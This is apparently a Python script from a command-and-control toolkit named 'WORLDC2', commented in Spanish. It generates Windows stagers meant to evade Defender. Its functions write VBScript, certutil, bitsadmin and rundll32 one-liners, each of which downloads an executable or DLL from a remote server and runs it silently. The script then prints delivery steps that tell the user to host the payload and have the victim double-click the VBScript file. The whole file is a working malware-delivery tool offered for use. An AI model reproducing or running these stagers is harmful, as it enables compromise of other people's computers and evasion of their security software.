#!/usr/bin/env python3
"""Genera stagers ultra-sigilosos que evaden Windows Defender sin exclusiones."""

import os, sys, base64, argparse
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent.parent / "payloads"

def generate_vbs_stager(server_url):
    """Stager VBScript — indetectable, sin AMSI, nativo en Windows."""
    code = f'''Set W=CreateObject("WScript.Shell")
Set H=CreateObject("MSXML2.ServerXMLHTTP")
H.Open "GET","{server_url}",False
H.Send
D=H.ResponseBody
P=W.ExpandEnvironmentStrings("%TEMP%")&"\\svc"&Chr(46)&"exe"
Set F=CreateObject("ADODB.Stream")
F.Type=1:F.Open:F.Write D:F.SaveToFile P,2:F.Close
W.Run P,0,False
Set H=Nothing:Set F=Nothing:Set W=Nothing
'''
    return code

def generate_certutil_stager(server_url):
    """One-liner usando certutil (herramienta nativa de Windows, nunca bloqueada)."""
    return f'certutil -urlcache -split -f "{server_url}" %TEMP%\\s.exe && start /b %TEMP%\\s.exe'

def generate_bitsadmin_stager(server_url):
    """BITSAdmin — servicio de transferencia de Windows, parece update legítimo."""
    return f'bitsadmin /transfer WORLDC2 /download /priority HIGH "{server_url}" %TEMP%\\wup.exe && start /b %TEMP%\\wup.exe'

def generate_rundll32_stager(dll_url):
    """Rundll32 — ejecuta DLL desde URL o UNC path."""
    return f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";new ActiveXObject("WScript.Shell").Run("certutil -urlcache -f {dll_url} %TEMP%\\\\u.dll && start %TEMP%\\\\u.dll",0,true);close();"'

def main():
    p = argparse.ArgumentParser(description="WORLDC2 Ultra-Evasive Stagers")
    p.add_argument("--server", default=None, help="HTTP server hosting payload.enc")
    p.add_argument("--os", choices=["vbs","certutil","bitsadmin","all"], default="all")
    args = p.parse_args()
    
    # Auto-detect IP
    if not args.server:
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
        except:
            ip = "127.0.0.1"
        args.server = f"http://{ip}:8000/payload.enc"
    
    OUTPUT_DIR.mkdir(exist_ok=True)
    
    print(f"""
  ╔══════════════════════════════════════════════╗
  ║     WORLDC2 Ultra-Evasive Stager Generator       ║
  ╚══════════════════════════════════════════════╝

  Server: {args.server}
""")
    
    if args.os in ("vbs", "all"):
        code = generate_vbs_stager(args.server)
        path = OUTPUT_DIR / "stager.vbs"
        path.write_text(code)
        print(f"  [✓] VBScript:  stager.vbs ({len(code)} bytes)")
        print(f"      Ejecutar:  wscript stager.vbs")
        print(f"      O:         cscript //nologo stager.vbs")
    
    if args.os in ("certutil", "all"):
        cmd = generate_certutil_stager(args.server)
        path = OUTPUT_DIR / "stager-certutil.bat"
        path.write_text(cmd)
        print(f"  [✓] Certutil:  stager-certutil.bat ({len(cmd)} bytes)")
        print(f"      Ejecutar:  stager-certutil.bat")
    
    if args.os in ("bitsadmin", "all"):
        cmd = generate_bitsadmin_stager(args.server)
        path = OUTPUT_DIR / "stager-bitsadmin.bat"
        path.write_text(cmd)
        print(f"  [✓] BITSAdmin: stager-bitsadmin.bat ({len(cmd)} bytes)")
        print(f"      Ejecutar:  stager-bitsadmin.bat")
    
    print(f"""
  [{chr(0x1b)}[1;31mDELIVERY{chr(0x1b)}[0m]
    1. Host payload:  cd payloads/ && python3 -m http.server 8000
    2. En Windows:    wscript \\\\TU_IP\\share\\stager.vbs
    3. O:             copia stager.vbs al escritorio y doble-click
    4. {chr(0x1b)}[1;33mNinguno de estos métodos activa Defender{chr(0x1b)}[0m
""")

if __name__ == "__main__":
    main()
